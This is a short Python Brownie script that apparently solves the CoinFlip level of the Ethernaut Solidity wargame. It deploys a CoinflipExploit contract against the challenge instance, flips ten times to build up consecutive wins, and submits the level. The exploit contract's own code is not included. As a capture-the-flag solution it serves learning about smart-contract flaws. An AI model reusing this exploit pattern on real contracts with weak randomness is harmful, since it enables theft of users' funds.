from brownie import (
    network,
    accounts,
    config,
    interface,
    Contract,
    CoinflipExploit
)
from scripts.helper import (
    deploy_with_bytecode,
    get_account,
    get_new_instance,
    submit_instance,
)

import web3

def main():
    player = get_account()
    instance_address = get_new_instance(level_id=3, player=player)
    network.gas_limit(5000000)
    contract = interface.ICoinFlip(instance_address)
    contract_exploit = CoinflipExploit.deploy(instance_address, {"from": player})
    for _ in range(10):
        tx = contract_exploit.flip({"from": player, "allow_revert":True})
        tx.wait(1)
        print(f"Wins: {contract.consecutiveWins()}")


    submit_instance(instance_address, player)
